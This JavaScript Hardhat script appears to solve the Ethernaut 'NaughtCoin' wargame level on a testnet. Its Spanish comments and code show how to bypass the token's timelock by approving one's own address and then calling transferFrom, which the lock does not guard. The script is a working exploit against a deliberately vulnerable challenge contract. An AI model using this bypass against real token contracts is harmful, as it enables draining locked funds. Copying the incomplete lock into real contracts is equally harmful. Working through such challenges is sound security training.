const { ethers } = require("hardhat")
const {
  abi: ABINaughtCoin,
} = require("../../artifacts/contracts/15/NaughtCoin.sol/NaughtCoin.json")
const { logTxResult } = require("../../utils/logTxResult")

require("dotenv").config()
const _provider = process.env.PROVIDER_MUMBAI
const privateKey = process.env.PRIVATE_KEY

const provider = new ethers.providers.JsonRpcProvider(_provider)
const signer = new ethers.Wallet(privateKey, provider)

/* DEPLOY + ATTACK */
/* Hay que aprovar un address para despues llamar a transferFrom. Esta ultima funcion no tiene el lock
Se puede dar allowance de address0 a address0. Asi, no nos hace falta otra wallet
*/
async function main() {
  const naughtCoinAddress = "0x69c94bdEf19b8FF0a54a73C4B2207a7282c19B20"
  /* instance */
  const NaughtCoinContract = new ethers.Contract(
    naughtCoinAddress,
    ABINaughtCoin,
    provider
  )

  const initSupply = await NaughtCoinContract.INITIAL_SUPPLY() // returned type -> wei

  /* approve */
  const tx = await NaughtCoinContract.connect(signer).approve(
    signer.address,
    initSupply,
    {
      gasLimit: 10000000,
    }
  )
  const res = await tx.wait()
  logTxResult(res)

  /* transferFrom - params -> (address from, address to, uint256 amount)  */
  const levelAddress = "0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6"
  const tx2 = await NaughtCoinContract.connect(signer).transferFrom(
    signer.address,
    levelAddress,
    initSupply,
    {
      gasLimit: 10000000,
    }
  )
  const res2 = await tx2.wait()
  logTxResult(res2)
}

main()
  .then(async (myContract) => {})
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

/* 
  npx hardhat run contracts/15/DeployAndCall__Attack.js --network mumbai
*/
